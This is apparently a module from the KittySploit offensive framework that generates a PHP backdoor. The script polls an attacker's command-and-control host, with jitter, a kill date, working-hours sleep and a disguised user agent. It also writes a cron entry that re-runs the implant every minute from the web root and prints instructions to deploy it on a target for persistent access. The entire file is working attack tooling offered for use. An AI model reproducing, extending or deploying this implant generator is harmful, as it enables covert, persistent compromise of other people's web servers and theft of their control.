from kittysploit import *

from lib.c2.agent_installer import build_php_polling_dropin
from lib.c2.beacon_profile import BeaconProfile


class Module(Backdoor):
    """PHP drop-in that polls reverse_http_polling (durable via cron/include)."""

    __info__ = {
        "name": "Kitty PHP HTTP Polling Drop-in",
        "description": (
            "Writes a PHP script that polls listeners/multi/reverse_http_polling. "
            "Deploy on a web host and trigger via cron, include, or HTTP request."
        ),
        "author": "KittySploit Team",
        "platform": Platform.PHP,
        "arch": Arch.PHP,
        "session_type": SessionType.POLLING,
        "listener": "listeners/multi/reverse_http_polling",
    }

    lhost = OptString("127.0.0.1", "C2 host (KittySploit listener)", True)
    lport = OptPort(8088, "C2 port", True)
    url_prefix = OptString("/c2", "URL prefix (must match listener)", False)
    client_id = OptString("", "Client/implant ID (empty = random)", False)
    poll_interval = OptInteger(10, "Poll interval seconds", False)
    jitter_percent = OptInteger(35, "Poll jitter percent", False)
    kill_date = OptString("", "Kill date ISO YYYY-MM-DD", False)
    working_hours = OptString("", "HH:MM-HH:MM window", False)
    timezone = OptString("UTC", "Timezone", False)
    sleep_outside_hours = OptInteger(3600, "Sleep outside working hours", False)
    use_ssl = OptBool(False, "HTTPS callback", False)
    user_agent = OptString("Mozilla/5.0", "HTTP User-Agent", False)
    filename = OptString("", "Output filename (empty = random .php)", False)
    cron_hint = OptBool(True, "Write cron.example alongside drop-in", False)

    def check(self):
        return bool(str(self.lhost or "").strip()) and int(self.lport or 0) > 0

    def run(self):
        if not self.check():
            print_error("lhost and lport are required")
            return False

        cid = str(self.client_id or "").strip() or ("php_" + self.random_text(6))
        profile = BeaconProfile.from_opts(self)
        php = build_php_polling_dropin(
            str(self.lhost),
            int(self.lport),
            cid,
            url_prefix=str(self.url_prefix or "/c2"),
            poll_interval=float(profile.poll_interval or 10),
            use_ssl=bool(self.use_ssl),
            user_agent=str(profile.user_agent or "Mozilla/5.0"),
            jitter_percent=float(profile.jitter_percent or 0),
            kill_date=str(profile.kill_date or ""),
            working_hours=str(profile.working_hours or ""),
            timezone=str(profile.timezone or "UTC"),
            sleep_outside_hours=float(profile.sleep_outside_hours or 3600),
        )

        name = str(self.filename or "").strip() or (self.random_text(8) + "_kitty_poll.php")
        if not name.endswith(".php"):
            name += ".php"

        if not self.write_out_dir(name, php):
            print_error("Failed to write PHP drop-in")
            return False

        if bool(self.cron_hint):
            cron = (
                f"# Poll every minute (adjust path and user)\n"
                f"* * * * * www-data /usr/bin/php -q /var/www/html/{name} >/dev/null 2>&1\n"
            )
            self.write_out_dir(name.replace(".php", "") + ".cron.example", cron)

        print_success(f"Generated: {name}")
        print_info(f"client_id={cid}  callback={self.lhost}:{self.lport}{self.url_prefix or '/c2'}")
        print_info("Deploy on target web root; run via cron or include for persistent polling")
        return True
